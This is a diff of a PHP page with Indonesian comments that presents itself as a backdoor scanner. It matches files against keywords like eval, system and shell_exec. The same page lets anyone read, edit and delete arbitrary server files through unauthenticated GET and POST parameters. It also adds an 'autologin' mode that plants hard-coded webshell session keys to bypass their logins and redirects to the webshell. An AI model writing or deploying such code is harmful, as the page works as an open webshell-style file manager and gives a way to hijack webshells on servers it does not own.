@@ -1,37 +1,49 @@
 <?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
 @session_start();
 
-// Default path lebih fleksibel
-$default_path = is_dir($_SERVER['DOCUMENT_ROOT'] ?? '')
+/**
+ * Default path fleksibel:
+ * - Kalau DOCUMENT_ROOT ada → pakai itu
+ * - Kalau tidak → pakai folder tempat file ini
+ */
+$default_path = isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT'])
     ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\')
-    : __DIR__; // fallback ke folder tempat script ini berada [web:198][web:203]
+    : __DIR__;
 
 $path = $_GET['path'] ?? $default_path;
 $view = $_GET['view'] ?? null;
 $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
+if ($page < 1) $page = 1;
 $per_page = 10;
 
 /**
  * MODE: AUTOLOGIN (session bypass + redirect ke webshell)
+ * Pemanggilan: scanners.php?action=autologin&target=/full/path/ke/file.php
  */
 if (isset($_GET['action']) && $_GET['action'] === 'autologin' && !empty($_GET['target'])) {
     $targetFile = $_GET['target'];
 
-    // Pastikan file ada
     if (file_exists($targetFile)) {
 
-        // TODO: sesuaikan daftar session key dengan pola webshell yang sering kamu temui
+        // SESUAIKAN daftar key ini dengan pola webshell yang sering kamu temui
         $sessionKeys = [
             'logged_in',
-            'd5587b78418472a83b6a4b208c081080', // contoh key dari kasus kamu
+            'd5587b78418472a83b6a4b208c081080',
         ];
 
         foreach ($sessionKeys as $k) {
             $_SESSION[$k] = true;
         }
 
-        // Hitung URL webshell dari path file
-        $relative = str_replace(rtrim($_SERVER['DOCUMENT_ROOT'], '/\\'), '', $targetFile);
+        $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') : '';
+        $relative = $docRoot && str_starts_with($targetFile, $docRoot)
+            ? substr($targetFile, strlen($docRoot))
+            : $targetFile; // fallback jelek tapi aman tidak fatal
+
         $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
         $url = $scheme . $_SERVER['HTTP_HOST'] . $relative;
 
@@ -43,7 +55,9 @@ if (isset($_GET['action']) && $_GET['action'] === 'autologin' && !empty($_GET['t
     exit;
 }
 
-// Fungsi scan backdoor (pattern sederhana)
+/**
+ * Scan backdoor sangat sederhana (pattern‑based)
+ */
 function scanBackdoor($dir) {
     $patterns = [
         'eval', 'system', 'shell_exec', 'exec', 'passthru', 'base64_decode', 'assert',
@@ -55,11 +69,13 @@ function scanBackdoor($dir) {
         return $backdoors;
     }
 
-    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
-    foreach ($files as $file) {
+    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
+    foreach ($it as $file) {
         if ($file->isFile() && strtolower($file->getExtension()) === 'php') {
             $content = @file_get_contents($file->getPathname());
-            if ($content === false) continue;
+            if ($content === false) {
+                continue;
+            }
             foreach ($patterns as $pattern) {
                 if (stripos($content, $pattern) !== false) {
                     $backdoors[] = $file->getPathname();
@@ -68,10 +84,13 @@ function scanBackdoor($dir) {
             }
         }
     }
+
     return $backdoors;
 }
 
-// Fungsi tampilkan isi file
+/**
+ * Helper: tampilkan isi file
+ */
 function showFileContent($file) {
     if (file_exists($file)) {
         return htmlspecialchars(file_get_contents($file));
@@ -79,51 +98,55 @@ function showFileContent($file) {
     return '';
 }
 
-// Fungsi tampilkan URL preview
+/**
+ * Helper: buat URL dari path file
+ */
 function showFileUrl($file) {
-    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
-    $relative_path = str_replace($docRoot, '', $file);
+    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') : '';
+    $relative_path = $docRoot && str_starts_with($file, $docRoot)
+        ? substr($file, strlen($docRoot))
+        : $file;
+
     $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
     return $scheme . $_SERVER['HTTP_HOST'] . $relative_path; // [web:198][web:209]
 }
 
-// Fungsi pagination modern
+/**
+ * Helper: pagination
+ */
 function getPagination($total, $per_page, $current_page, $path) {
-    $total_pages = max(1, ceil($total / $per_page));
+    $total_pages = max(1, (int)ceil($total / $per_page));
     if ($total_pages <= 1) return '';
 
-    $pagination = '';
+    $html = '';
 
-    // First page
-    $pagination .= "<a href='?path=" . urlencode($path) . "&page=1' class='btn btn-sm btn-outline-primary me-1'>⏮ First</a>";
+    $html .= "<a href='?path=" . urlencode($path) . "&page=1' class='btn btn-sm btn-outline-primary me-1'>⏮ First</a>";
 
-    // Previous page
     if ($current_page > 1) {
-        $pagination .= "<a href='?path=" . urlencode($path) . "&page=" . ($current_page - 1) . "' class='btn btn-sm btn-outline-primary me-1'>← Prev</a>";
+        $html .= "<a href='?path=" . urlencode($path) . "&page=" . ($current_page - 1) . "' class='btn btn-sm btn-outline-primary me-1'>← Prev</a>";
     }
 
-    // 5 tombol aktif di sekitar current page
     $start = max(1, $current_page - 2);
-    $end = min($total_pages, $current_page + 2);
+    $end   = min($total_pages, $current_page + 2);
 
     for ($i = $start; $i <= $end; $i++) {
         $active = $i == $current_page ? 'btn-primary' : 'btn-outline-primary';
-        $pagination .= "<a href='?path=" . urlencode($path) . "&page=$i' class='btn btn-sm $active me-1'>$i</a>";
+        $html  .= "<a href='?path=" . urlencode($path) . "&page=$i' class='btn btn-sm $active me-1'>$i</a>";
     }
 
-    // Next page
     if ($current_page < $total_pages) {
-        $pagination .= "<a href='?path=" . urlencode($path) . "&page=" . ($current_page + 1) . "' class='btn btn-sm btn-outline-primary me-1'>Next →</a>";
+        $html .= "<a href='?path=" . urlencode($path) . "&page=" . ($current_page + 1) . "' class='btn btn-sm btn-outline-primary me-1'>Next →</a>";
     }
 
-    // Last page
-    $pagination .= "<a href='?path=" . urlencode($path) . "&page=$total_pages' class='btn btn-sm btn-outline-primary'>Last ⏭</a>";
+    $html .= "<a href='?path=" . urlencode($path) . "&page=$total_pages' class='btn btn-sm btn-outline-primary'>Last ⏭</a>";
 
-    return $pagination;
+    return $html;
 }
 
-// Edit file
-if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
+/**
+ * Edit file
+ */
+if (isset($_POST['edit_file'], $_POST['file_content'])) {
     $file = $_POST['edit_file'];
     if (file_exists($file) && is_writable($file)) {
         if (file_put_contents($file, $_POST['file_content']) !== false) {
@@ -136,7 +159,9 @@ if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
     }
 }
 
-// Delete file
+/**
+ * Delete file
+ */
 if (isset($_POST['delete_file'])) {
     $file = $_POST['delete_file'];
     if (file_exists($file) && is_writable($file)) {
@@ -151,7 +176,9 @@ if (isset($_POST['delete_file'])) {
     }
 }
 
-// Jalankan scan sekali saja per request, biar ga dobel-dobel
+/**
+ * Jalankan scan sekali
+ */
 $backdoors = is_dir($path) ? scanBackdoor($path) : [];
 $total_backdoors = count($backdoors);
 $offset = ($page - 1) * $per_page;
@@ -173,9 +200,9 @@ $page_files = array_slice($backdoors, $offset, $per_page);
         .card-header { background: linear-gradient(45deg, #3498db, #2980b9); color: white; border-radius: 15px 15px 0 0 !important; }
         .btn-primary { background: linear-gradient(45deg, #3498db, #2980b9); border: none; }
         .btn-primary:hover { background: linear-gradient(45deg, #2980b9, #3498db); }
-        .btn-success { background: linear-gradient(45deg, #27ae60, #229954); }
+        .btn-success { background: linear-gradient(45deg, #27ae60, #229954); border: none; }
         .btn-success:hover { background: linear-gradient(45deg, #229954, #27ae60); }
-        .btn-danger { background: linear-gradient(45deg, #e74c3c, #c0392b); }
+        .btn-danger { background: linear-gradient(45deg, #e74c3c, #c0392b); border: none; }
         .btn-danger:hover { background: linear-gradient(45deg, #c0392b, #e74c3c); }
         .btn-warning { background: linear-gradient(45deg, #f1c40f, #f39c12); border: none; }
         .btn-warning:hover { background: linear-gradient(45deg, #f39c12, #f1c40f); }
@@ -250,7 +277,7 @@ $page_files = array_slice($backdoors, $offset, $per_page);
                             <div class="text-center">
                                 <?= getPagination($total_backdoors, $per_page, $page, $path) ?>
                                 <div class="stats mt-2">
-                                    Halaman <?= $page ?> dari <?= max(1, ceil($total_backdoors / $per_page)) ?>
+                                    Halaman <?= $page ?> dari <?= max(1, (int)ceil($total_backdoors / $per_page)) ?>
                                     (<?= $total_backdoors ?> file terindikasi)
                                 </div>
                             </div>
@@ -284,8 +311,7 @@ $page_files = array_slice($backdoors, $offset, $per_page);
                         <hr>
                         <form method="post">
                             <input type="hidden" name="edit_file" value="<?= htmlspecialchars($view) ?>">
-                            <textarea name="file_content" class="form-control" id="script-content" rows="15">
-<?= showFileContent($view) ?></textarea>
+                            <textarea name="file_content" class="form-control" id="script-content" rows="15"><?= showFileContent($view) ?></textarea>
                             <button type="submit" class="btn btn-success mt-2">
                                 <i class="fas fa-save"></i> Simpan Perubahan
                             </button>
@@ -311,6 +337,8 @@ $page_files = array_slice($backdoors, $offset, $per_page);
 <script>
     let currentUrl = '<?= $view ? showFileUrl($view) : '' ?>';
     let currentFilePath = '<?= $view ? addslashes($view) : '' ?>';
+    let currentPath = '<?= htmlspecialchars($path) ?>';
+    let currentPage = '<?= (int)$page ?>';
 
     function openPreview() {
         if (currentUrl) {
@@ -333,9 +361,8 @@ $page_files = array_slice($backdoors, $offset, $per_page);
             alert('Tidak ada file terpilih.');
             return;
         }
-        const url = '?action=autologin&target=' + encodeURIComponent(currentFilePath) +
-                    '&path=' + encodeURIComponent('<?= htmlspecialchars($path) ?>') +
-                    '&page=<?= (int)$page ?>';
+        const url = '?action=autologin'
+            + '&target=' + encodeURIComponent(currentFilePath);
         window.location.href = url;
     }
 </script>
